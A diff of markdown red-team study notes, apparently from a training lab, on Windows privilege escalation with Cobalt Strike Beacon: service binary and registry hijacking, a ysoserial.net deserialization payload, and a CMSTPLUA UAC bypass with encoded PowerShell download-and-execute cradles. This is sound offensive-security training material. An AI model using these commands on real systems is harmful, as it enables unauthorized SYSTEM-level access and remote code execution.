@@ -12,6 +12,9 @@ User Rights Assignment - Fine-grained control over account privilege
 	User Rights
 		Control access to objects
 
+```powershell
+execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit 
+```
 ## Path Interception
 Path interception is a class of vulnerability that occurs when an adversary is able to drop an executable into a location where it will get executed before the intended one
 #### PATH Environment Variable
@@ -112,11 +115,14 @@ beacon> cacls "C:\Program Files\Bad Windows Service" # Try for ALL paths
 # Upload payload and catch SYSTEM beacon
 beacon> cd C:\Program Files\Bad Windows Service
 beacon> upload C:\Payloads\dns_x64.svc.exe      # REMEMBER OPSEC
-beacon> mv dns_x64.svc.exe Service.exe  
+beacon> mv dns_x64.svc.exe Service.exe       # this name is because Service.exe follows \BadWindowsService\ ... See Example above for reference
 
 # Restart Services
 beacon> sc_stop BadWindowsService # If we have perms to start/stop services
 beacon> sc_start BadWindowsService
+
+# Cleanup
+beacon> rm Service.exe
 
 Wait for computer to restart # If we dont have perms to start/stop services
 ```
@@ -144,6 +150,7 @@ beacon> sc_stop BadWindowsService
 beacon> upload C:\Payloads\BadWindowsService.exe
 beacon> sc_start BadWindowsService
 ```
+
 #### Service Registry Permissions
 When a new service is installed, an entry is written into the registry at `HKLM\SYSTEM\CurrentControlSet\Services`.
 
@@ -154,17 +161,20 @@ Exploiting Service Registry Permissions
 # Enumerate Services
 beacon> sc_enum
 
-# Identify Access Perms
+# Verify the permissions of the service's regsitry key.
 beacon> powerpick Get-Acl -Path HKLM:\SYSTEM\CurrentControlSet\Services\BadWindowsService | fl # Use psinject for OPSEC instead...
+	# IF we see FullControl we can pwn it
 
 # Modify binary path and restart service
 beacon> sc_stop BadWindowsService
-beacon> sc_qc BadWindowsService   # Make note of binary path
+beacon> cd C:\path\to\somewhere\else   # change Beacon CWD
+beacon> upload C:\Payloads\dns_x64.exe # upload payload
+beacon> sc_qc BadWindowsService        # Make note of binary path
 beacon> sc_config BadWindowsService C:\Path\to\Payload.exe 0 2
 beacon> sc_start BadWindowsService
 
 # Restore binary path (after beacon has checked in)
-beacon> sc_config BadWindowsService C:\original\bin 0 2
+beacon> sc_config BadWindowsService C:\original\binary\path 0 2
 beacon> rm <payload.exe>
 ```
 
@@ -200,6 +210,8 @@ beacon> mv dns_x64.dll BadDll.dll
 ```
 ![[Pasted image 20251223164351.png]]
 ## Software Vulnerabilities
+
+#### Unsafe Deserialization
 When such software is running in an elevated context, exploitation from a user context may result in an elevation of privilege.
 
 Software applications may be exploitable via traditional vulnerabilities such as buffer overflows, format strings, directory traversal, SQL or command injection, and deserialization of untrusted data.  
@@ -217,9 +229,16 @@ Right-click beacon > Access > One-Liner > pick payload
 # Serialize
 C:\Users\Attacker>C:\Tools\ysoserial.net\ysoserial\bin\Release\ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "powershell -nop -ep bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwAC4AMAAuADEAOgAzADEANAA5ADAALwAnACkA" -o raw --outputpath=C:\Payloads\data.bin
 
-# Upload file to target
+# Upload file to target (to location specified in app)
 beacon> cd C:\Temp
 beacon> upload C:\Payloads\data.bin
+
+# Check and start service if necessary
+beacon> sc_query BadWindowsService
+beacon> sc_start BadWindowsService
+
+# Cleanup
+beacon> rm data.bin
 ```
 
 
@@ -255,16 +274,27 @@ beacon> elevate                       # show available exploits
 beacon> elevate [exploit] [listener]  # run exploit
 ```
 
-Example CMSTPLUA UAC Bypass
+#### CMSTPLUA UAC Bypass
+Requirements:
+	Process our Beacon lives in must be in `C:\Windows*`
+
+OPSEC Note
+	Supposedly this is not a BOF so use with caution?
+
+NOTE:
+	if we can run powershell as admin, we can just do that then powershell -ep bypass -nop a payload we uploaded in windows\temp...
 ```powershell
 # spawn new beacon
-beacon> spawn x64 http
+beacon> spawn x64 http  # by default, this spawns rundll32.exe (BAD OPSEC)
+	# By adjusting Malleable C2 profile, this should be fine... can manually adjust with ak if needed
 
-# generate powershell one-liner
+# Interact with new beacon
+
+# generate powershell one-liner of new beacon
 Right Click > Access > One-liner > tcp-local listener
 
 # bypass uac and run rev-shell cmd...
-beacon> runasadmin uac-cmstplua powershell -nop -exec bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwAC4AMAAuADEAOgA2ADQAMwA2ADMALwAnACkA
+beacon> runasadmin uac-cmstplua powershell -nop -exec bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwAC4AMAAuADEAOgAxADgAMQA2ADIALwAnACkA
 
 # connect to elevated beacon
 beacon> connect localhost 1337
